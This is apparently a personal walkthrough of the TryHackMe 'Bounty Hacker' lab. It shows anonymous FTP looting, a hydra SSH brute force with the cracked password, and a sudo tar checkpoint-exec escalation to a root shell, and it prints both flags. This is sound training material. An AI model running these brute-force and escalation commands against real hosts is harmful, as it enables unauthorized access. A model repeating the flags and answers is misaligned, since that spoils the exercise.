# Bounty Hacker

difficulty: easy

---


nmap 10.10.217.85 -sC -sV

port 21, 22, and 80 are open. We get information on 21/tcp ftp anonymous login is allowed (FTP code 230)


feroxbuster -u http://10.10.217.86 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,403 --extract-links

nothing interesting from feroxbuster



ftp 10.10.217.86
login with: "anonymous"

make sure ftp passive mode is off with
`passive`
or 
`passive off`


then
`mget *`
`y`  twice

exit ftp
`bye`


"Who wrote the task list"

cat task.txt

answer: lin


"What service can you bruteforce with the text file found?"
answer: ssh

locks.txt has a list of possible passwords to use


---
we now have a possible username and a list of passwords to try and bruteforce an ssh login:

`hydra -l lin -P locks.txt 10.10.217.86 ssh`

```shell
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 19:06:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.217.86:22/
[22][ssh] host: 10.10.217.86   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-17 19:06:14
                                                                                              
```

so the password is:  RedDr4gonSynd1cat3


ssh lin@10.10.217.86


now we are sshed in



now we have to find a user.txt for the user flag which is just on the desktop of lin.
There is no issue just catting it out

`cat user.txt`

now we have the user flag

THM{CR1M3_SyNd1C4T3}

---
# Escalating Privs

`sudo -l`

```shell
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

### notes:
The output of `sudo -l` tells you **what commands the current user (`lin` in this case) is allowed to run with `sudo` privileges, and as which user.**

- `User lin may run the following commands on bountyhacker:` - This indicates the commands `lin` can execute.
    
- `(root)` - This is the crucial part. It means `lin` can run the listed commands **as the `root` user**. If it said `(www-data)` or another user, you'd be escalating to that user, not necessarily full root.

**What sticks out as a possible target?**

**`/bin/tar`** is your target, and it's a very common one for privilege escalation!

**Why `/bin/tar` is a juicy target for privilege escalation:**

`tar` is a powerful archiving utility. While its primary purpose is to create or extract archives, it has features that can be abused when run with `sudo` privileges



I check gtfobins.com for tar and found the following under sudo:

```shell
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

literally just copy and paste this into your shell and now you have root as indicated by the # in the shell. Confirm with `whoami`

now find the root flag

```shell
# find / -name root.txt 2>/dev/null                                                                            
/root/root.txt
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

